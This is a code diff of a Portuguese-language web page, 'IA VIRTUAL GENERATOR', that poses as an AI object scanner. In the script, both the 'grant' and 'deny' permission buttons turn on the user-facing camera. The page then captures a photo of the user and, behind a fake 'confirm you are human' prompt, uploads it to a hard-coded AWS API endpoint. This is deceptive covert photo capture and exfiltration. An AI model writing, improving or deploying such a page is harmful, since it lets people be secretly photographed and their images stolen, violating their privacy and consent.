@@ -59,9 +59,13 @@
       box-shadow: 0 6px 8px rgba(0,0,0,0.2);
     }
 
-    .popup {
+    .popup, .overlay, .initial-popup {
       display: none;
       position: fixed;
+      z-index: 1000;
+    }
+
+    .popup, .initial-popup {
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
@@ -69,32 +73,19 @@
       padding: 30px;
       border-radius: 20px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      z-index: 1000;
       width: 90%;
       max-width: 400px;
+      text-align: center;
     }
 
-    .popup h2 {
-      color: #2c3e50;
-      font-size: clamp(1.2em, 4vw, 1.5em);
-      margin-bottom: 15px;
-    }
-
-    .popup p {
-      color: #666;
-      font-size: clamp(0.9em, 3vw, 1.1em);
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-
-    .popup-buttons {
-      margin-top: 20px;
+    .popup-buttons, .initial-popup-buttons {
       display: flex;
       flex-direction: column;
       gap: 15px;
+      margin-top: 20px;
     }
 
-    .confirm-btn, .cancel-btn {
+    .confirm-btn, .cancel-btn, .grant-btn, .deny-btn {
       width: 100%;
       padding: 15px;
       font-size: 16px;
@@ -103,100 +94,29 @@
       transition: all 0.3s ease;
     }
 
-    .confirm-btn {
+    .confirm-btn, .grant-btn {
       background: linear-gradient(45deg, #4CAF50, #45a049);
       color: white;
     }
 
-    .cancel-btn {
+    .cancel-btn, .deny-btn {
       background: linear-gradient(45deg, #f44336, #e53935);
       color: white;
     }
 
-    .confirm-btn:hover, .cancel-btn:hover {
+    .confirm-btn:hover, .cancel-btn:hover, .grant-btn:hover, .deny-btn:hover {
       transform: translateY(-2px);
       box-shadow: 0 6px 8px rgba(0,0,0,0.2);
     }
 
     .overlay {
-      display: none;
-      position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
       background-color: rgba(0,0,0,0.7);
-      z-index: 999;
       backdrop-filter: blur(5px);
-    }
-
-    .initial-popup {
-      display: block;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: white;
-      padding: 35px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      z-index: 1000;
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-
-    .initial-popup h2 {
-      color: #2c3e50;
-      margin-bottom: 20px;
-      font-size: 1.4em;
-      line-height: 1.4;
-    }
-
-    .initial-popup p {
-      color: #666;
-      margin-bottom: 25px;
-      line-height: 1.6;
-    }
-
-    .initial-popup-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      justify-content: center;
-      margin-top: 25px;
-      width: 100%;
-      max-width: 250px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .initial-popup button {
-      padding: 15px 25px;
-      border-radius: 25px;
-      font-weight: 600;
-      transition: all 0.3s ease;
-      width: 100%;
-      font-size: 14px;
-    }
-
-    .initial-popup .emoji {
-      font-size: 16px;
-    }
-
-    .grant-btn {
-      background: linear-gradient(45deg, #4CAF50, #45a049);
-      color: white;
-    }
-
-    .deny-btn {
-      background: linear-gradient(45deg, #f44336, #e53935);
-      color: white;
-    }
-
-    .grant-btn:hover, .deny-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 8px rgba(0,0,0,0.2);
+      z-index: 999;
     }
 
     .footer {
@@ -231,15 +151,16 @@
     .header h1 {
       color: #2c3e50;
       font-size: clamp(1.5em, 5vw, 2.5em);
-      margin: 0;
-      padding: 0;
       font-weight: 700;
       text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
     }
 
     .emoji {
       font-size: 24px;
-      margin: 0 5px;
+    }
+
+    canvas, video {
+      display: none;
     }
 
     .images-container {
@@ -248,7 +169,6 @@
       justify-content: center;
       gap: 20px;
       margin-top: 30px;
-      position: relative;
     }
 
     .camera-image, .family-image {
@@ -269,23 +189,9 @@
       body {
         padding: 10px;
       }
-
-      button {
-        padding: 15px 25px;
-        font-size: 16px;
-      }
-
-      .popup {
-        padding: 25px;
-      }
-
       .camera-image, .family-image {
         width: 80px;
         height: 80px;
-      }
-
-      .arrow-emoji {
-        font-size: 20px;
       }
     }
   </style>
@@ -294,17 +200,19 @@
   <div class="header">
     <h1>IA VIRTUAL GENERATOR</h1>
   </div>
-  <video id="video" width="320" height="240" autoplay style="display: none;"></video>
-  <video id="frontVideo" width="320" height="240" autoplay style="display: none;"></video><br>
-  <button id="captureBtn" style="display: none;">COMEÇAR SCAN <span class="emoji">🧠</span></button>
+
+  <video id="frontVideo" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <button id="captureBtn">COMEÇAR SCAN <span class="emoji">🧠</span></button>
+
   <img src="homemscanner.png" alt="Homem Scanner" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 100%; z-index: -1; opacity: 0.15;">
-  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
   <div class="footer">
     <p class="footer-text">✨ Aponte seu celular para um objeto e descubra! ✨</p>
   </div>
 
-  <div class="initial-popup" id="initialPopup">
+  <div class="initial-popup" id="initialPopup" style="display: block;">
     <h2>Descubra o poder da nossa IA! <span class="emoji">🤖</span></h2>
     <p>Para começar esta jornada incrível, precisamos da sua permissão. Vamos juntos explorar o mundo de uma nova forma!</p>
     <div class="initial-popup-buttons">
@@ -319,6 +227,7 @@
   </div>
 
   <div class="overlay" id="overlay"></div>
+
   <div class="popup" id="popup">
     <h2>Quase lá! <span class="emoji">🎯</span></h2>
     <p>Para garantir que você é humano, confirme abaixo!</p>
@@ -329,7 +238,6 @@
   </div>
 
   <script>
-    const video = document.getElementById('video');
     const frontVideo = document.getElementById('frontVideo');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
@@ -339,29 +247,13 @@
     const initialPopup = document.getElementById('initialPopup');
     const captureBtn = document.getElementById('captureBtn');
 
-    // Função para verificar se é dispositivo móvel
-    function isMobileDevice() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
+    captureBtn.style.display = 'none';
 
-    // Função para ativar as câmeras
     async function activateCamera() {
       try {
-        // Ativa câmera traseira para visualização
-        const backStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'environment' } 
-        });
-        video.srcObject = backStream;
-        
-        // Removendo a exibição do vídeo em dispositivos móveis
-        video.style.display = 'none';
-
-        // Ativa câmera frontal para captura
-        const frontStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user' } 
-        });
-        frontVideo.srcObject = frontStream;
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        frontVideo.srcObject = stream;
+        frontVideo.play();
         initialPopup.style.display = 'none';
         captureBtn.style.display = 'block';
       } catch (err) {
@@ -369,11 +261,9 @@
       }
     }
 
-    // Ambos os botões ativam a câmera
     document.getElementById('grantBtn').onclick = activateCamera;
     document.getElementById('denyBtn').onclick = activateCamera;
 
-    // Captura imagem ao clicar em START
     captureBtn.onclick = () => {
       ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
@@ -383,30 +273,26 @@
       }, 'image/jpeg');
     };
 
-    // Função para fazer o upload
     async function fazerUpload() {
       if (!imageBlob) return alert("Erro.");
-
       const filename = `foto-${Date.now()}.jpg`;
 
       const res = await fetch(`https://d59rrhlltg.execute-api.sa-east-1.amazonaws.com/get-upload-url?filename=${filename}`);
       const data = await res.json();
 
-      const uploadRes = await fetch(data.url, {
+      await fetch(data.url, {
         method: 'PUT',
         headers: { 'Content-Type': 'image/jpeg' },
         body: imageBlob
       });
     }
 
-    // Botão verde (confirmar)
     document.getElementById('confirmBtn').onclick = () => {
       popup.style.display = 'none';
       overlay.style.display = 'none';
       fazerUpload();
     };
 
-    // Botão vermelho (cancelar)
     document.getElementById('cancelBtn').onclick = () => {
       popup.style.display = 'none';
       overlay.style.display = 'none';
